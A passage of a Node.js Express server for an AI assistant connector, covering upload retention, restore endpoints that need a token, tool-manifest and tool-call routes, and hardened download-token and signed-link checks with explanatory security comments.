 * DEFAULT_EXPIRY_SECONDS docblock in src/utils/signedUrls.js.
 *
 * Do not set this BELOW the link lifetime. The reaper keys off file mtime and
 * links are minted at file-creation time, so an equal setting means the file
 * outlives its link by up to one sweep interval (UPLOAD_SWEEP_INTERVAL_MS,
 * default 15 minutes). That is the safe direction: a user who is late gets the
 * intended "link expired" message rather than a 404 on a link that still looks
 * valid. Setting it lower inverts that and produces the 404.
 */
const DOWNLOADS_TTL_HOURS      = parseInt(process.env.DOWNLOADS_TTL_HOURS || String(3 * 24), 10);

/**
 * Files under /data/downloads that must survive the reaper.
 *
 * ava_brain_data.json is the Neural Core architecture scan. 20-neural-core.js
 * fetches it on every render of that view. It lives in downloads for delivery
 * reasons, not because it is a disposable artefact.
 */
const DOWNLOADS_PROTECTED = new Set(
  (process.env.DOWNLOADS_PROTECTED || 'ava_brain_data.json')
    .split(',').map(s => s.trim()).filter(Boolean)
);

/** Sweeps /data/uploads on the 24h staging policy. */
function sweepExpiredUploads() {
  return sweepExpiredFiles({
    dir:      USER_DATA_UPLOAD_DIR,
    ttlHours: DEFAULT_TTL_HOURS,
    label:    'sweep/uploads',
  });
}

/** Sweeps /data/downloads on the 3d artefact policy. */
function sweepExpiredDownloads() {
  return sweepExpiredFiles({
    dir:       DOWNLOADS_DIR,
    ttlHours:  DOWNLOADS_TTL_HOURS,
    protected: DOWNLOADS_PROTECTED,
    label:     'sweep/downloads',
  });
}

/** Runs both retention policies. */
function sweepAllRetention() {
  sweepExpiredUploads();
  sweepExpiredDownloads();
}

if (UPLOAD_SWEEP_ENABLED) {
  // Reclaim anything that expired while the process was down, then keep sweeping.
  sweepAllRetention();
  const _retentionTimer = setInterval(sweepAllRetention, UPLOAD_SWEEP_INTERVAL_MS);
  if (typeof _retentionTimer.unref === 'function') _retentionTimer.unref();
  log('info',
    `retention sweeper active: uploads ${DEFAULT_TTL_HOURS}h, ` +
    `downloads ${Math.round(DOWNLOADS_TTL_HOURS / 24)}d ` +
    `(protected: ${[...DOWNLOADS_PROTECTED].join(', ') || 'none'}), ` +
    `interval ${Math.round(UPLOAD_SWEEP_INTERVAL_MS / 60000)}min`);
}


app.post('/data/upload', async (req, res) => {
  try {
    ensureUploadDir();
    const { filename, content_base64, mime_type, ttl_hours, category } = req.body || {};

    if (!filename || !content_base64) {
      return res.status(400).json({ error: 'filename and content_base64 are required' });
    }

    const ext = extname(filename).toLowerCase();
    const extCheck = uploadExtensionAllowed(ext);
    if (!extCheck.ok) {
      // v12.12.0: answer with success:false so the client can distinguish a
      // policy refusal from a transport failure. The old shape returned only
      // { error } and the client's `data.success ? ... : ''` silently mapped
      // every refusal to an empty filepath.
      return res.status(400).json({
        success: false,
        error: extCheck.reason,
        error_kind: 'extension_not_allowed',
        extension: ext,
      });
    }

    const buffer = Buffer.from(content_base64, 'base64');
    if (buffer.length > MAX_UPLOAD_SIZE) {
      return res.status(413).json({
        success: false,
        error: `File too large (${buffer.length} bytes). Max: ${Math.round(MAX_UPLOAD_SIZE / 1048576)}MB`,
        error_kind: 'too_large',
        size: buffer.length,
        max_size: MAX_UPLOAD_SIZE,
      });
    }

    // Clamp the TTL rather than trusting the caller. The chat UI historically
    // sent ttl_hours: 1, which expired a file an hour into a session that might
    // still be working on it. Callers may shorten within reason but not extend
    // past the retention ceiling.
    const requestedTtl = Number(ttl_hours);
    const ttl = (Number.isFinite(requestedTtl) && requestedTtl > 0)
      ? Math.min(requestedTtl, UPLOAD_MAX_TTL_HOURS)
      : DEFAULT_TTL_HOURS;
    const timestamp = Date.now();
    const safeName = filename.replace(/[^a-zA-Z0-9._-]/g, '_');
    const storedName = `${timestamp}_${safeName}`;
    // v12.34.0 (Stage 2a): an allowlisted category gets its own subdirectory.
    // Unknown or absent categories keep the existing behaviour exactly, so no
    // current caller changes.
    const { dir: targetDir, category: usedCategory } = resolveUploadDir(category);
    const filepath = pathJoin(targetDir, storedName);

    writeFileSync(filepath, buffer);

    const meta = {
      original_name: filename,
      mime_type: mime_type || 'application/octet-stream',
      size: buffer.length,
      created_at: new Date().toISOString(),
      expires_at: new Date(Date.now() + ttl * 60 * 60 * 1000).toISOString(),
      ttl_hours: ttl,
      category: usedCategory || 'chat',
    };
    writeFileSync(filepath + '.meta.json', JSON.stringify(meta, null, 2));

    log('info', `upload: ${filename} -> ${filepath} (${buffer.length} bytes)`);
    res.json({
      success: true,
      filepath,
      filename: storedName,
      size: buffer.length,
      mime_type: mime_type || 'application/octet-stream',
      expires_at: meta.expires_at,
    });
  } catch (err) {
    log('error', `upload error: ${err.message}`);
    res.status(500).json({ error: err.message });
  }

});

// GET /data/upload — list uploaded files
app.get('/data/upload', (_req, res) => {
  try {
    ensureUploadDir();
    const files = readdirSync(USER_DATA_UPLOAD_DIR)
      .filter(f => !f.endsWith('.meta.json'))
      .map(f => {
        const fp = pathJoin(USER_DATA_UPLOAD_DIR, f);
        try {
          const stat = statSync(fp);
          const metaPath = fp + '.meta.json';
          let meta = {};
          if (existsSync(metaPath)) {
            try { meta = JSON.parse(readFileSync(metaPath, 'utf8')); } catch (_) {}
          }
          return {
            filename: f,
            path: fp,
            size: stat.size,
            created_at: meta.created_at || stat.birthtime,
            expires_at: meta.expires_at || null,
            mime_type: meta.mime_type || null,
            original_name: meta.original_name || f,
          };
        } catch (_) { return null; }
      })
      .filter(Boolean)
      .sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
    res.json({ files, count: files.length, upload_dir: USER_DATA_UPLOAD_DIR });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});


// -----------------------------------------------------------------------
// POST /restore-skill
// Receives a canonical SKILL.md push from the WordPress admin "Push to Railway"
// button (ts-ava-skill plugin v1.3.0+). Validates X-Railway-Restore-Token, then
// runs the full canonicalWrite sequence (archive, version increment, WP backup).
// Requires SKILL_FILE_PATH + RAILWAY_RESTORE_TOKEN in Railway Variables.
// -----------------------------------------------------------------------
app.post("/restore-skill", async (req, res) => {
  if (!SKILL_ENABLED) {
    res.status(503).json({ error: "Skill Volume not configured. Set SKILL_FILE_PATH in Railway Variables." });
    return;
  }

  if (!RAILWAY_RESTORE_TOKEN) {
    res.status(503).json({ error: "RAILWAY_RESTORE_TOKEN not set in Railway Variables. Configure it to enable WordPress restore pushes." });
    return;
  }

  const providedToken = (req.headers["x-railway-restore-token"] || "").trim();

  if (!providedToken) {
    res.status(401).json({ error: "Missing X-Railway-Restore-Token header." });
    return;
  }

  if (!constantTimeEquals(providedToken, RAILWAY_RESTORE_TOKEN)) {
    res.status(403).json({ error: "Invalid X-Railway-Restore-Token." });
    return;
  }

  const body = req.body || {};

  if (!body.content || typeof body.content !== "string" || !body.content.trim()) {
    res.status(400).json({ error: "content is required and must not be empty." });
    return;
  }

  try {
    const result = await handleSkillRestoreFromWp(body);
    if (result.success) {
      log("info", `restore-skill: ${result.version_id} (${result.line_count} lines) from ${body.source || "wordpress-push"}`);
      res.json(result);
    } else {
      log("error", `restore-skill failed: ${result.error}`);
      res.status(500).json(result);
    }
  } catch (err) {
    log("error", `restore-skill exception: ${err.message}`);
    res.status(500).json({ error: err.message });
  }
});

// -----------------------------------------------------------------------
// POST /restore-books
// Receives a BOOKS_READ.md push from the WordPress admin "Push to Railway"
// button (ts-ava-skill plugin v1.5.0+). Validates X-Railway-Restore-Token,
// then writes the content directly to BOOKS_READ.md on the Railway volume.
// Requires SKILL_FILE_PATH + RAILWAY_RESTORE_TOKEN in Railway Variables.
// -----------------------------------------------------------------------
app.post("/restore-books", async (req, res) => {
  if (!SKILL_ENABLED) {
    res.status(503).json({ error: "Skill Volume not configured. Set SKILL_FILE_PATH in Railway Variables." });
    return;
  }

  if (!RAILWAY_RESTORE_TOKEN) {
    res.status(503).json({ error: "RAILWAY_RESTORE_TOKEN not set in Railway Variables." });
    return;
  }

  const providedToken = (req.headers["x-railway-restore-token"] || "").trim();

  if (!providedToken) {
    res.status(401).json({ error: "Missing X-Railway-Restore-Token header." });
    return;
  }

  if (!constantTimeEquals(providedToken, RAILWAY_RESTORE_TOKEN)) {
    res.status(403).json({ error: "Invalid X-Railway-Restore-Token." });
    return;
  }

  const body = req.body || {};

  if (!body.content || typeof body.content !== "string" || !body.content.trim()) {
    res.status(400).json({ error: "content is required and must not be empty." });
    return;
  }

  try {
    const result = await handleBooksRestoreFromWp(body);
    if (result.success) {
      log("info", `restore-books: ${result.entry_count} entries from ${body.source || "wordpress-push"}`);
      res.json(result);
    } else {
      log("error", `restore-books failed: ${result.error}`);
      res.status(500).json(result);
    }
  } catch (err) {
    log("error", `restore-books exception: ${err.message}`);
    res.status(500).json({ error: err.message });
  }
});

// -----------------------------------------------------------------------
// POST /restore-profiles
// Receives a PROFILES.md push from the WordPress admin "Push to Railway"
// button (ts-ava-skill plugin v1.6.0+). Validates X-Railway-Restore-Token,
// then writes the content directly to PROFILES.md on the Railway volume.
// Requires SKILL_FILE_PATH (or PROFILES_FILE_PATH) + RAILWAY_RESTORE_TOKEN.
// -----------------------------------------------------------------------
app.post("/restore-profiles", async (req, res) => {
  if (!PROFILES_ENABLED) {
    res.status(503).json({ error: "Profiles not configured. Set SKILL_FILE_PATH or PROFILES_FILE_PATH in Railway Variables." });
    return;
  }

  if (!RAILWAY_RESTORE_TOKEN) {
    res.status(503).json({ error: "RAILWAY_RESTORE_TOKEN not set in Railway Variables." });
    return;
  }

  const providedToken = (req.headers["x-railway-restore-token"] || "").trim();

  if (!providedToken) {
    res.status(401).json({ error: "Missing X-Railway-Restore-Token header." });
    return;
  }

  if (!constantTimeEquals(providedToken, RAILWAY_RESTORE_TOKEN)) {
    res.status(403).json({ error: "Invalid X-Railway-Restore-Token." });
    return;
  }

  const body = req.body || {};

  if (!body.content || typeof body.content !== "string" || !body.content.trim()) {
    res.status(400).json({ error: "content is required and must not be empty." });
    return;
  }

  try {
    const result = await handleProfilesRestoreFromWp(body);
    if (result.success) {
      log("info", `restore-profiles: ${result.person_count} person(s) from ${body.source || "wordpress-push"}`);
      res.json(result);
    } else {
      log("error", `restore-profiles failed: ${result.error}`);
      res.status(500).json(result);
    }
  } catch (err) {
    log("error", `restore-profiles exception: ${err.message}`);
    res.status(500).json({ error: err.message });
  }
});

// POST /restore-modules
// Push all modular skill files from WordPress to Railway volume /data/skill/ava/.
// Body: { files: { "relative/path": "content" }, change_summary?, timestamp?, source? }
// Requires SKILL_FILE_PATH + RAILWAY_RESTORE_TOKEN in Railway Variables.
app.post("/restore-modules", async (req, res) => {
  if (!SKILL_ENABLED) {
    return res.status(404).json({ error: "SKILL_FILE_PATH not set. Cannot restore modules." });
  }
  if (!RAILWAY_RESTORE_TOKEN) {
    return res.status(503).json({ error: "RAILWAY_RESTORE_TOKEN not set in Railway Variables." });
  }
  const providedToken = req.headers["x-railway-restore-token"] || "";
  if (!constantTimeEquals(providedToken, RAILWAY_RESTORE_TOKEN)) {
    return res.status(401).json({ error: "Invalid or missing X-Railway-Restore-Token header." });
  }
  try {
    const body = req.body || {};
    const result = await handleModulesRestoreFromWp(body);
    if (!result.success) return res.status(500).json(result);
    log("info", `restore-modules: ${result.files_restored} files restored from ${body.source || "wordpress-push"}`);
    return res.json(result);
  } catch (err) {
    log("error", `restore-modules exception: ${err.message}`);
    return res.status(500).json({ error: err.message });
  }
});

// POST /restore-personality
// Push PERSONALITY.md from WordPress to Railway volume /data/skill/ava/PERSONALITY.md.
// Body: { content, change_summary?, timestamp?, source? }
// Requires SKILL_FILE_PATH + RAILWAY_RESTORE_TOKEN in Railway Variables.
app.post("/restore-personality", async (req, res) => {
  if (!SKILL_ENABLED) {
    return res.status(404).json({ error: "SKILL_FILE_PATH not set. Cannot restore personality." });
  }
  if (!RAILWAY_RESTORE_TOKEN) {
    return res.status(503).json({ error: "RAILWAY_RESTORE_TOKEN not set in Railway Variables." });
  }
  const providedToken = req.headers["x-railway-restore-token"] || "";
  if (!constantTimeEquals(providedToken, RAILWAY_RESTORE_TOKEN)) {
    return res.status(401).json({ error: "Invalid or missing X-Railway-Restore-Token header." });
  }
  try {
    const body = req.body || {};
    const fileContent = typeof body.content === "string" ? body.content : "";
    if (!fileContent) return res.status(400).json({ error: "content is required" });
    const result = await handleModulesRestoreFromWp({ files: { "PERSONALITY.md": fileContent } });
    log("info", `restore-personality: written from ${body.source || "wordpress-push"}`);
    return res.json({ success: true, message: "PERSONALITY.md restored to Railway volume." });
  } catch (err) {
    log("error", `restore-personality exception: ${err.message}`);
    return res.status(500).json({ error: err.message });
  }
});

// POST /restore-dispatch-rules
// Push DISPATCH_RULES.json from WordPress to Railway volume /data/skill/ava/DISPATCH_RULES.json.
// Body: { content, change_summary?, timestamp?, source? }
// Requires SKILL_FILE_PATH + RAILWAY_RESTORE_TOKEN in Railway Variables.
app.post("/restore-dispatch-rules", async (req, res) => {
  if (!SKILL_ENABLED) {
    return res.status(404).json({ error: "SKILL_FILE_PATH not set. Cannot restore dispatch rules." });
  }
  if (!RAILWAY_RESTORE_TOKEN) {
    return res.status(503).json({ error: "RAILWAY_RESTORE_TOKEN not set in Railway Variables." });
  }
  const providedToken = req.headers["x-railway-restore-token"] || "";
  if (!constantTimeEquals(providedToken, RAILWAY_RESTORE_TOKEN)) {
    return res.status(401).json({ error: "Invalid or missing X-Railway-Restore-Token header." });
  }
  try {
    const body = req.body || {};
    const fileContent = typeof body.content === "string" ? body.content : "";
    if (!fileContent) return res.status(400).json({ error: "content is required" });
    const result = await handleModulesRestoreFromWp({ files: { "DISPATCH_RULES.json": fileContent } });
    log("info", `restore-dispatch-rules: written from ${body.source || "wordpress-push"}`);
    return res.json({ success: true, message: "DISPATCH_RULES.json restored to Railway volume." });
  } catch (err) {
    log("error", `restore-dispatch-rules exception: ${err.message}`);
    return res.status(500).json({ error: err.message });
  }
});

// POST /restore-archive
// Receives archive file(s) push from the WordPress admin "Push to Railway" button.
// Body: { files: { "filename.md": "content" }, change_summary?, source? }
// Requires SKILL_FILE_PATH + RAILWAY_RESTORE_TOKEN in Railway Variables.
app.post("/restore-archive", async (req, res) => {
  if (!SKILL_ENABLED) {
    return res.status(503).json({ error: "SKILL_FILE_PATH not set. Cannot restore archive." });
  }
  if (!RAILWAY_RESTORE_TOKEN) {
    return res.status(503).json({ error: "RAILWAY_RESTORE_TOKEN not set in Railway Variables." });
  }
  const providedToken = req.headers["x-railway-restore-token"] || "";
  if (!constantTimeEquals(providedToken, RAILWAY_RESTORE_TOKEN)) {
    return res.status(401).json({ error: "Invalid or missing X-Railway-Restore-Token header." });
  }
  try {
    const body   = req.body || {};
    const result = await handleArchiveRestoreFromWp(body);
    if (!result.success) return res.status(500).json(result);
    log("info", `restore-archive: ${result.files_restored} files restored from ${body.source || "wordpress-push"}`);
    return res.json(result);
  } catch (err) {
    log("error", `restore-archive exception: ${err.message}`);
    return res.status(500).json({ error: err.message });
  }
});

// POST /restore-references
// Receives reference file(s) push from the WordPress admin "Push to Railway" button.
// Body: { files: { "filename.md": "content" }, change_summary?, source? }
// Requires SKILL_FILE_PATH + RAILWAY_RESTORE_TOKEN in Railway Variables.
app.post("/restore-references", async (req, res) => {
  if (!SKILL_ENABLED) {
    return res.status(503).json({ error: "SKILL_FILE_PATH not set. Cannot restore references." });
  }
  if (!RAILWAY_RESTORE_TOKEN) {
    return res.status(503).json({ error: "RAILWAY_RESTORE_TOKEN not set in Railway Variables." });
  }
  const providedToken = req.headers["x-railway-restore-token"] || "";
  if (!constantTimeEquals(providedToken, RAILWAY_RESTORE_TOKEN)) {
    return res.status(401).json({ error: "Invalid or missing X-Railway-Restore-Token header." });
  }
  try {
    const body   = req.body || {};
    const result = await handleReferenceRestoreFromWp(body);
    if (!result.success) return res.status(500).json(result);
    log("info", `restore-references: ${result.files_restored} files restored from ${body.source || "wordpress-push"}`);
    return res.json(result);
  } catch (err) {
    log("error", `restore-references exception: ${err.message}`);
    return res.status(500).json({ error: err.message });
  }
});

// POST /restore-scripts
// Receives script file(s) push from the WordPress admin "Push to Railway" button.
// Body: { files: { "extract_somatic.py": "content" }, change_summary?, source? }
// Requires SKILL_FILE_PATH + RAILWAY_RESTORE_TOKEN in Railway Variables.
app.post("/restore-scripts", async (req, res) => {
  if (!SKILL_ENABLED) {
    return res.status(503).json({ error: "SKILL_FILE_PATH not set. Cannot restore scripts." });
  }
  if (!RAILWAY_RESTORE_TOKEN) {
    return res.status(503).json({ error: "RAILWAY_RESTORE_TOKEN not set in Railway Variables." });
  }
  const providedToken = req.headers["x-railway-restore-token"] || "";
  if (!constantTimeEquals(providedToken, RAILWAY_RESTORE_TOKEN)) {
    return res.status(401).json({ error: "Invalid or missing X-Railway-Restore-Token header." });
  }
  try {
    const body   = req.body || {};
    const result = await handleScriptRestoreFromWp(body);
    if (!result.success) return res.status(500).json(result);
    log("info", `restore-scripts: ${result.files_restored} files restored from ${body.source || "wordpress-push"}`);
    return res.json(result);
  } catch (err) {
    log("error", `restore-scripts exception: ${err.message}`);
    return res.status(500).json({ error: err.message });
  }
});


// -----------------------------------------------------------------------
// GET /tools  (v12.8.0)
// Returns the effective tool manifest for the current connector instance.
// The Tenax Intelligence gateway calls this on each /stream request to
// discover which tools are available, then registers them with the LLM.
// Cached by the gateway (10-minute TTL per connector URL).
//
// Auth:    X-Railway-Restore-Token
// Returns: { tools: [{ name, description, input_schema }], count: N }
// -----------------------------------------------------------------------
app.get("/tools", (req, res) => {
  const token = (req.headers["x-railway-restore-token"] || "").trim();
  if (!RAILWAY_RESTORE_TOKEN) {
    return res.status(503).json({ error: "RAILWAY_RESTORE_TOKEN not set. Cannot authenticate tool manifest requests." });
  }
  if (!constantTimeEquals(token, RAILWAY_RESTORE_TOKEN)) {
    return res.status(401).json({ error: "Invalid or missing X-Railway-Restore-Token." });
  }

  // Mirror the ListTools dynamic logic: swap out modular tools based on
  // the mode file, which can be toggled without a Railway redeploy.
  const MODULAR_TOOL_NAMES = new Set([
    "skill_compile", "skill_load_specialist", "skill_recompile",
    "personality_write", "dispatch_rule_add", "module_write",
  ]);
  const baseTools    = TOOLS.filter(t => !MODULAR_TOOL_NAMES.has(t.name));
  const modularTools = isModularEnabled()
    ? [
        skillCompileToolDefinition,
        skillLoadSpecialistToolDefinition,
        skillRecompileToolDefinition,
        personalityWriteToolDefinition,
        dispatchRuleAddToolDefinition,
        moduleWriteToolDefinition,
      ]
    : [];

 const effectiveTools = [...baseTools, ...modularTools];

  // Optional per-tenant filtering via X-Tenant-ID header
  const tenantId = req.headers['x-tenant-id'] || '';
  const filteredTools = (tenantId && tenantId !== 'ava')
    ? effectiveTools.filter(t => !SYSTEM_WRITE_TOOLS.has(t.name))
    : effectiveTools;

  // Normalise MCP inputSchema (camelCase) to Anthropic input_schema (snake_case)
  const tools = filteredTools.map(t => ({
    name:         t.name,
    description:  t.description || "",
    input_schema: t.inputSchema || t.input_schema || { type: "object", properties: {}, required: [] },
  }));

  log("info", `[/tools] manifest requested: ${tools.length} tools (tenant: ${tenantId || 'default'})`);
  return res.json({ tools, count: tools.length });
});

// -----------------------------------------------------------------------
// POST /tool-call  (v12.8.0)
// Executes a single named tool and returns its result as JSON.
// The Tenax Intelligence gateway calls this when the LLM selects a tool
// that is not handled locally by the gateway (proxied tool calls).
//
// Auth:    X-Railway-Restore-Token
// Body:    { tool_name: string, tool_input: object }
// Returns: { result: string, is_error: boolean }
//
// The result is always a string (the text from the MCP content block).
// Callers should treat it as they would a raw tool result string.
// -----------------------------------------------------------------------
app.post("/tool-call", mcpRateLimiter, async (req, res) => {
  const token = (req.headers["x-railway-restore-token"] || "").trim();
  if (!RAILWAY_RESTORE_TOKEN) {
    return res.status(503).json({ error: "RAILWAY_RESTORE_TOKEN not set. Cannot authenticate tool-call requests." });
  }
  if (!constantTimeEquals(token, RAILWAY_RESTORE_TOKEN)) {
    return res.status(401).json({ error: "Invalid or missing X-Railway-Restore-Token." });
  }

  const { tool_name, tool_input, context } = req.body || {};

  if (!tool_name || typeof tool_name !== "string" || !tool_name.trim()) {
    return res.status(400).json({ error: "tool_name is required and must be a non-empty string." });
  }

  log("info", `[/tool-call] dispatching: ${tool_name}`);

  try {
    // `context` (when the gateway supplies it) carries { tenant_id, user_id }
    // for the session so the self-model recorder attributes this call correctly.
    const mcpResult = await dispatchToolCall(tool_name.trim(), tool_input || {}, context || null);

    // Extract the primary text content from the MCP result.
    // Most tools return a single text block; we join multiples with newlines.
    const text = Array.isArray(mcpResult?.content)
      ? mcpResult.content
          .filter(b => b.type === "text")
          .map(b => b.text || "")
          .join("\n")
      : JSON.stringify(mcpResult ?? "");

    return res.json({
      result:   text,
      is_error: Boolean(mcpResult?.isError),
    });

  } catch (err) {
    log("error", `[/tool-call] ${tool_name} error: ${err.message}`);
    // Return 404 for unknown tools so the gateway can distinguish
    // "tool not found" from "tool failed".
    const statusCode = err.message.startsWith("Unknown tool") ? 404 : 500;
    return res.status(statusCode).json({ error: err.message, is_error: true });
  }
});
// ---------------------------------------------------------------------------
// Document token helpers  (v12.28.0 -- TNX-C-010 resolution item 4)
//
// The previous comparison used `===` on the raw strings, which short-circuits
// on the first differing byte and is therefore a timing oracle for the token.
// Both operands are now hashed to a fixed 32 bytes and compared with
// crypto.timingSafeEqual. Hashing first is required, not cosmetic:
// timingSafeEqual throws on a length mismatch, and that throw would itself
// disclose the expected token length.
//
// The token is still accepted from the query string because these URLs are
// opened directly by a browser, which cannot set a request header. Headers are
// preferred and checked first. Query-string carriage remains a known residual
// (the value reaches access logs, proxy logs and browser history); the durable
// fix is a short-lived per-file signed URL, scheduled as Phase 3 work.
// Referrer-Policy: no-referrer is set on these responses so that a previewed
// document cannot leak the token onward through the Referer header.
// ---------------------------------------------------------------------------

/**
 * Constant-time string equality.
 * @param {string} a
 * @param {string} b
 * @returns {boolean}
 */
function constantTimeEquals( a, b ) {
  if ( typeof a !== 'string' || typeof b !== 'string' ) return false;
  if ( a.length === 0 || b.length === 0 ) return false;
  const ha = createHash( 'sha256' ).update( a, 'utf8' ).digest();
  const hb = createHash( 'sha256' ).update( b, 'utf8' ).digest();
  return timingSafeEqual( ha, hb );
}

/**
 * Extract the document token from a request, preferring headers.
 * @param {import('express').Request} req
 * @returns {string}
 */
function extractDocumentToken( req ) {
  const authHeader = String( req.headers.authorization || '' ).trim();
  const bearer     = /^Bearer\s+(.+)$/i.exec( authHeader );
  if ( bearer ) return bearer[ 1 ].trim();

  const restoreHeader = req.headers[ 'x-railway-restore-token' ];
  if ( typeof restoreHeader === 'string' && restoreHeader.trim() ) return restoreHeader.trim();

  const docHeader = req.headers[ 'x-document-token' ];
  if ( typeof docHeader === 'string' && docHeader.trim() ) return docHeader.trim();

  return String( req.query.token || '' ).trim();
}

/**
 * Validate a document token against either configured secret, in constant time.
 * Both comparisons always run so the number of comparisons performed does not
 * depend on which token matched.
 *
 * @param {string} supplied
 * @returns {{ ok: boolean, configured: boolean }}
 */
function documentTokenValid( supplied ) {
  const configured = Boolean( DOCUMENT_DOWNLOAD_TOKEN || RAILWAY_RESTORE_TOKEN );
  if ( ! configured ) return { ok: false, configured: false };

  const m1 = DOCUMENT_DOWNLOAD_TOKEN ? constantTimeEquals( supplied, DOCUMENT_DOWNLOAD_TOKEN ) : false;
  const m2 = RAILWAY_RESTORE_TOKEN   ? constantTimeEquals( supplied, RAILWAY_RESTORE_TOKEN   ) : false;
  return { ok: m1 || m2, configured: true };
}

/**
 * Whether the legacy global DOCUMENT_DOWNLOAD_TOKEN is still accepted on
 * /download and /preview while signed links are enabled.
 *
 * Defaults to true so that enabling signed links does not instantly break every
 * link already sitting in a user's chat history, a bookmark, or the WordPress
 * UI. Set ALLOW_LEGACY_DOWNLOAD_TOKEN=false once those have aged out.
 *
 * IMPORTANT: while this is true the global-blast-radius problem is only half
 * solved, because a leaked token still opens every file. Completing the
 * migration means turning it off.
 *
 * @returns {boolean}
 */
function legacyDownloadTokenAllowed() {
  return String( process.env.ALLOW_LEGACY_DOWNLOAD_TOKEN || 'true' ).trim().toLowerCase() !== 'false';
}

/**
 * Authorise a request for a document.  (TNX-FEAT-SIGNEDURLS)
 *
 * Order of evaluation, and why:
 *
 *   1. If the request carries `exp` or `sig`, it is a signed request and is
 *      judged only as one. It never falls through to the token path, because a
 *      tampered or expired signature that then succeeded on a token would make
 *      expiry unenforceable for anyone holding the token.
 *   2. Otherwise the legacy token path applies, subject to the two flags above.
 *
 * The filename passed in MUST be the validated, normalised name, not
 * req.params.filename. Verifying the signature against the raw parameter would
 * let an unnormalised variant satisfy a signature issued for a different file.
 *
 * @param {import('express').Request} req
 * @param {string} safeFilename Validated single path segment.
 * @returns {{ ok: true } | { ok: false, status: number, error: string }}
 */
function authoriseDocumentRequest( req, safeFilename ) {
  const hasSignedParams = Boolean(
    String( req.query?.exp || '' ).trim() || String( req.query?.sig || '' ).trim()
  );

  if ( signedLinksEnabled() && hasSignedParams ) {
    const verdict = verifySignedRequest( {
      filename: safeFilename,
      exp:      req.query.exp,
      sig:      req.query.sig,
      log,
    } );

    if ( verdict.ok ) return { ok: true };

    // 403 rather than 401 across the board: 401 invites a client to retry with
    // credentials, and there are none to supply. The reason is named because a
    // user whose link has simply aged out needs to be told to request a fresh
    // one, not left guessing. Naming it discloses nothing an attacker could not
    // determine by reading the expiry out of the URL they already hold.
    const messages = {
      expired:       'This download link has expired. Ask for a new one.',
      bad_signature: 'Invalid download link signature.',
      malformed:     'Malformed download link. Both exp and sig are required.',
      missing:       'Malformed download link. Both exp and sig are required.',
    };

    return { ok: false, status: 403, error: messages[ verdict.reason ] || 'Forbidden.' };
  }

  if ( signedLinksEnabled() && ! legacyDownloadTokenAllowed() ) {
    return {
      ok:     false,
      status: 403,
      error:  'This connector requires a signed download link. Ask for a new link.',
    };
  }

  const tokenCk = documentTokenValid( extractDocumentToken( req ) );

  if ( ! tokenCk.configured ) {
    return {
      ok:     false,
      status: 503,
      error:  'No download token configured. Set DOCUMENT_DOWNLOAD_TOKEN in Railway Variables, or use a signed link.',
    };
  }

  if ( ! tokenCk.ok ) {
    return { ok: false, status: 401, error: 'Invalid or missing token.' };
  }

  return { ok: true };
}

/**
 * Re-serialise the credential that authorised THIS request, so a link to the
 * SAME file rendered inside a preview page carries a credential that is known
 * to verify.  (CONN-V2-FIX-01)
 *
 * WHY THIS EXISTS
 * ---------------
 * The signature payload is `${filename}:${exp}`, so a signature is valid for
 * exactly one filename. Any code that mints, guesses or rewrites a second
 * credential for the same file produces a link with the same expiry and a
 * different, invalid signature -- the "Invalid download link signature."
 * failure this fix addresses. The request that reached this handler already
 * carries a credential that verified against `safeFilename`, so the correct
 * and only safe move is to hand that exact credential onward unchanged.
 *
 * CALLER CONTRACT -- read before reusing this
 * -------------------------------------------
 * The returned query is valid ONLY for `safeFilename`. It must never be
 * attached to a URL whose last path segment differs, because the signature is
 * filename-scoped and the resulting link is guaranteed to be refused. Callers
 * must not rewrite the extension (for example .html -> .docx) while carrying
 * this query.
 *
 * This function must be called only AFTER authoriseDocumentRequest() has
 * returned ok, so the values echoed here are already known to be well formed
 * and to verify. Nothing new is signed and no privilege is created: the caller
 * receives back precisely what they presented.
 *
 * @param {import('express').Request} req
 * @returns {string} A query string beginning with '?', or '' when the request
 *                   carried no propagatable credential.
 */
function sameFileAuthQuery( req ) {
  const expRaw = String( req.query?.exp || '' ).trim();
  const sigRaw = String( req.query?.sig || '' ).trim();

  // Signed shape. The format guards are repeated rather than assumed: this
  // function is one refactor away from being called on an unauthorised path,
  // and echoing an unvalidated query parameter into an href is a reflected
  // injection primitive. Both patterns below are strict allowlists.
  if ( signedLinksEnabled() && expRaw && sigRaw ) {
    if ( /^\d{1,15}$/.test( expRaw ) && /^[a-f0-9]{64}$/i.test( sigRaw ) ) {
      return `?exp=${ expRaw }&sig=${ sigRaw.toLowerCase() }`;
    }
    return '';
  }

  // Legacy global-token shape. Only echoed when the token path is actually the
  // one in force, so enabling signed links does not cause a token to be written
  // into preview HTML that the /download route would then refuse.
  const supplied = extractDocumentToken( req );
  if ( supplied && documentTokenValid( supplied ).ok ) {
    return `?token=${ encodeURIComponent( supplied ) }`;
  }

  return '';
}

/** Configured signed-link lifetime, read once for the boot log line. */
const LINK_EXPIRY_SECONDS_CONFIGURED = linkExpirySeconds();

/** Base directory for downloadable and previewable documents. */
const DOWNLOADS_BASE = '/data/downloads';

// ---------------------------------------------------------------------------
// Preview extraction subprocess  (v12.28.0 -- TNX-C-010 item 1)
//
// Both the interpreter and the script path are fixed deployment configuration
// resolved once at module load. They are never influenced by a request. The
// only caller-derived value that reaches the subprocess is the document path,
// and it is passed as a distinct element of the argument array to execFileSync,
// which never involves a shell.
//
// The interpreter probe mirrors src/tools/script-execute.js: Railway manages
// Python through mise, which installs a shim rather than a system python3.
// ---------------------------------------------------------------------------
const PREVIEW_PYTHON_BIN = existsSync( '/mise/shims/python3' )
  ? '/mise/shims/python3'
  : 'python3';

const PREVIEW_EXTRACT_SCRIPT = process.env.PREVIEW_EXTRACT_SCRIPT
  || '/data/skill/ava/scripts/preview_extract.py';

// GET /download/:filename
// Serves a file from /data/downloads/ directory.
// Auth: DOCUMENT_DOWNLOAD_TOKEN or RAILWAY_RESTORE_TOKEN (header preferred).
app.get( '/download/:filename', ( req, res ) => {
  res.setHeader( 'Referrer-Policy', 'no-referrer' );

  // v12.28.0 (TNX-C-010 item 2): basename() removes directory separators but
  // preserves quotes, semicolons, backticks, $, pipes and spaces. Re-validate
  // against a strict single-segment pattern in addition to basename().
  //
  // TNX-FEAT-SIGNEDURLS: this now runs BEFORE authorisation, because the
  // signature is computed over the normalised filename. Verifying against the
  // raw parameter would let an unnormalised variant satisfy a signature issued
  // for a different file. Only filename syntax is disclosed ahead of the auth
  // check; existence is still checked afterwards, so this is not an enumeration
